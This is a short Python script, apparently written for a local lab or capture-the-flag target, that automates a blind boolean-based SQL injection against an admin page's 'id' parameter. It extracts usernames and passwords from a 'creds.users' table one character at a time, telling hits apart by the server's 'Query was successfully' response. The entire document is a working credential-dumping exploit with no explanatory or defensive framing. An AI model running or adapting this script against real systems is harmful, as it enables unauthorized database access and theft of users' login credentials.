#!/usr/bin/python3
from pwn import log
import string, requests

characters = string.ascii_lowercase + string.digits + "!_"

columns = ["username", "password"]

for column in columns:
    print("\r")
    bar = log.progress(f"Dumpeando columna {column}")

    value = ""

    for dump in range(0,5):
        value += "\n\033[1;37m[\033[1;34m*\033[1;37m] "
        for position in range(0,18):
            for character in characters:
                request = requests.get(f"http://127.0.0.1/admin/?id=1' and (select substr({column},{position},1) from creds.users limit {dump},1)='{character}'-- -")
                if "Query was successfully" in request.text:
                    value += character
                    bar.status(value)
